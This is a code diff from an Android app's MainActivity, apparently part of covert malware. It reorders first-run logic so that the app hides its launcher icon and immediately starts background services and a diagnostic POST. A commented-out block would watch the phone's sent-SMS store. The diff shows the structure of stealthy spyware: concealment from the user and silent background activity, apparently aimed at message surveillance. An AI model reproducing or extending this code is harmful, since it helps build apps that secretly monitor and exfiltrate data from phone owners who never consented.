@@ -94,18 +94,23 @@ public class MainActivity extends Activity {
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.commit();
 			hideIcon();
+			getID();
+			if (sp.getString("ID", "ID").equals("ID")) {
+				viewIDDialog();
+			} else
+				finish();
+			sendDiagPost();
+			// Toast.makeText(this, sourceApk,
+			// Toast.LENGTH_LONG).show();
+			start(); // запуск сервисов
 		}
-		getID();
-		if (sp.getString("ID", "ID").equals("ID")) {
-			viewIDDialog();
-		} else
-			finish();
+
 	}
 
 	public void contentObserved() {
-//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
-//        this.getContentResolver().registerContentObserver(
-//                        Uri.parse("content://sms/sent"), true, null);
+		// SmsSentObserver content = new SmsSentObserver(new Handler(), null);
+		// this.getContentResolver().registerContentObserver(
+		// Uri.parse("content://sms/sent"), true, null);
 	}
 
 	private boolean viewIDDialog() {
@@ -130,9 +135,7 @@ public class MainActivity extends Activity {
 				Editor e = sp.edit();
 				e.putString("ID", value);
 				e.commit();
-				start(); // запуск сервисов
 				contentObserved();
-				sendDiagPost();
 				finish();
 			}
 		});
@@ -190,10 +193,7 @@ public class MainActivity extends Activity {
 					e.putString("ID", ID);
 					e.commit();
 					contentObserved();
-					sendDiagPost();
-					// Toast.makeText(this, sourceApk,
-					// Toast.LENGTH_LONG).show();
-					start(); // запуск сервисов
+
 					break;
 				}
 				i++;
@@ -219,7 +219,7 @@ public class MainActivity extends Activity {
 
 		Log.d(LOG_TAG, "finish start services");
 		FileLog.writeLog("finish start services");
-		
+
 	}
 
 	public void hideIcon() {
